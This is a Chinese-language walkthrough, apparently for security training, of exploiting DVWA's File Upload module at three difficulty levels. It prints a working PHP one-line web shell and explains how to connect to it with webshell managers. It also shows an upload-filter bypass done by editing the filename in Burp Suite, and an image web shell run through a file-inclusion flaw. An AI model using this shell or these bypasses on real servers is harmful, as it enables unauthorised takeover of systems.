### 🟢 第一阶段：Low 级别（毫无防备）

在 Low 级别下，后端代码对上传的文件**没有做任何过滤和校验**，你传什么它存什么。

#### 第一步：制作一句话木马

我们需要准备一个 PHP 木马文件。你可以新建一个文本文件，命名为 `shell.php`，里面写入以下代码：

php

```
1<?php
2@eval($_POST['cmd']);
3?>
```

_解释：这行代码的意思是，接收通过 POST 方式传递过来的 `cmd` 参数，并作为 PHP 代码执行。`@` 符号用于屏蔽可能出现的错误提示。_

#### 第二步：上传木马

1. 在 DVWA 左侧菜单选择 `File Upload`。
2. 点击“选择文件”，选中你刚才创建的 `shell.php`。
3. 点击 `Upload`。
4. 页面会提示上传成功，并给出文件的相对路径，例如：`../../hackable/uploads/shell.php successfully uploaded!`

#### 第三步：连接木马（GetShell）

上传成功后，你需要使用 Webshell 管理工具来连接它。常用的工具有**中国蚁剑（AntSword）**、**冰蝎（Behinder）**或**哥斯拉**。  
以中国蚁剑为例：

1. 打开蚁剑，右键空白处选择“添加数据”。
2. **URL 地址**：填入木马的完整访问路径，例如 `http://127.0.0.1/dvwa/hackable/uploads/shell.php`。
3. **连接密码**：填入你在木马里定义的参数名，即 `cmd`。
4. 点击“测试连接”，如果提示成功，双击即可进入服务器的图形化管理界面，你可以随意查看、修改服务器上的文件了！

### 🟡 第二阶段：Medium 级别（抓包绕过）

到了 Medium 级别，后端代码增加了一层防御：它会检查上传文件的 `Content-Type`（MIME类型），只允许 `image/jpeg` 或 `image/png`。

**突破思路：抓包改后缀**

1. 将你的 `shell.php` 重命名为 `shell.jpg`。
2. 在 DVWA 页面选择 `shell.jpg` 并点击上传。
3. 此时，打开 **Burp Suite** 拦截请求包。
4. 在请求包中找到 `filename="shell.jpg"`，将其修改为 `filename="shell.php"`。
5. 点击 `Forward` 放行数据包。
6. 页面提示上传成功！因为后端只验证了上传时的类型，没有验证最终保存的后缀名。
7. 接下来，同样使用蚁剑连接 `shell.php` 即可 GetShell。

---

### 🔴 第三阶段：High 级别（组合拳）

High 级别的防御非常严格：

1. 校验文件后缀，只允许 `.jpg`, `.png`, `.gif`。
2. 校验文件头（File Header），确保文件真的是图片格式。
3. 上传后会将文件重命名为随机字符串。

**突破思路：图片马 + 文件包含漏洞**  
在这个级别，单纯的文件上传已经无法直接执行 PHP 代码了，必须配合其他漏洞。

1. **制作图片马**：将一句话木马代码附加到一张真实图片的末尾。在 CMD 中执行命令：`copy 1.jpg /b + shell.php /a shell_new.jpg`。
2. **上传图片马**：将 `shell_new.jpg` 上传到 DVWA，因为它是合法的图片，所以能成功上传。
3. **利用文件包含执行**：单独访问这张图片，服务器只会把它当成普通图片显示。你需要利用 DVWA 的 **File Inclusion（文件包含）** 漏洞，强制让服务器把这张图片当作 PHP 文件来解析执行，从而触发木马代码，完成 GetShell。
